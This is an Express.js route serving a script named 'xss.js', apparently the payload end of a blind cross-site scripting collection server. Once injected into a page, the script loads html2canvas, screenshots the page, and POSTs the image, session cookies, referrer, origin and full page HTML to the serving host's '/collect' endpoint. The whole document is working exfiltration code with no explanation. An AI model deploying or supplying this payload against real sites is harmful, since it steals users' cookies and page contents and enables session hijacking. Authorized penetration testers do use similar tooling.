app.get('/xss.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    (function(){
      var s = document.createElement('script');
      s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
      s.onload = function() {
        html2canvas(document.body).then(function(canvas) {
          fetch('https://${req.headers.host}/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              screenshot: canvas.toDataURL('image/png'),
              cookies: document.cookie,
              userAgent: navigator.userAgent,
              referer: document.referrer,
              origin: location.origin,
              html: document.documentElement.outerHTML,
              iframe: window.self !== window.top,
              time: new Date().toISOString()
            })
          });
        });
      };
      document.head.appendChild(s);
    })();
  `);
});
